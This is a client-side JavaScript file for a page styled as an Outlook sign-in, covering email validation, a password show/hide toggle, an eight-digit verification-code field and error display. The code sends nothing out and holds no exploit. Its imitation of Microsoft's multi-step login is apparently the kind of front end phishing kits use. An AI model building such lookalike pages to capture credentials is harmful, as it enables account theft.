// script.js — Outlook Sign-in Client-side

document.addEventListener('DOMContentLoaded', function () {

    /* ══ EMAIL VALIDATION ══ */
    const emailForm  = document.getElementById('emailForm');
    const emailInput = document.getElementById('emailInput');
    const emailErr   = document.getElementById('emailErr');

    if (emailForm && emailInput) {
        emailInput.focus();
        emailForm.addEventListener('submit', function (e) {
            const val = emailInput.value.trim();
            if (!val) {
                e.preventDefault();
                showErr(emailErr, emailInput, 'Enter a Microsoft account.');
            }
        });
        if (emailInput) emailInput.addEventListener('input', () => clearErr(emailErr, emailInput));
    }

    /* ══ PASSWORD SHOW/HIDE ══ */
    const pwForm    = document.getElementById('pwForm');
    const pwInput   = document.getElementById('pwInput');
    const pwErr     = document.getElementById('pwErr');
    const eyeBtn    = document.getElementById('eyeBtn');
    const eyeShow   = document.getElementById('eyeShow');
    const eyeHide   = document.getElementById('eyeHide');

    function setPwVisible(show) {
        if (!pwInput) return;
        pwInput.type = show ? 'text' : 'password';
        if (eyeShow) eyeShow.style.display = show ? 'none'   : 'inline';
        if (eyeHide) eyeHide.style.display = show ? 'inline' : 'none';
    }

    if (eyeBtn) {
        eyeBtn.addEventListener('click', function (e) {
            e.preventDefault();
            setPwVisible(pwInput.type !== 'text');
            pwInput.focus();
        });
    }

    if (pwForm && pwInput) {
        pwInput.focus();
        pwForm.addEventListener('submit', function (e) {
            if (!pwInput.value) {
                e.preventDefault();
                if (pwErr) showErr(pwErr, pwInput, 'Enter your password.');
            }
        });
        if (pwErr) pwInput.addEventListener('input', () => clearErr(pwErr, pwInput));
    }

    /* ══ CODE INPUT (numeric only) ══ */
    const codeInput = document.getElementById('codeInput');
    const codeErr   = document.getElementById('codeErr');
    const codeForm  = document.getElementById('codeForm');

    if (codeInput) {
        codeInput.focus();
        codeInput.addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 8);
            if (codeErr) clearErr(codeErr, codeInput);
        });
        if (codeForm) {
            codeForm.addEventListener('submit', function (e) {
                if (!codeInput.value.trim()) {
                    e.preventDefault();
                    if (codeErr) showErr(codeErr, codeInput, 'Enter the verification code.');
                }
            });
        }
    }

    /* ══ HELPERS ══ */
    function showErr(el, input, msg) {
        if (!el) return;
        const icon = '<svg width="13" height="13" viewBox="0 0 24 24" fill="#d93025" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="11"/><path d="M12 7v6" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17.5" r="1.2" fill="#fff"/></svg>';
        el.innerHTML = icon + ' ' + msg;
        if (input) { input.classList.add('err'); input.focus(); }
    }
    function clearErr(el, input) {
        if (el)    el.innerHTML = '';
        if (input) input.classList.remove('err');
    }
});
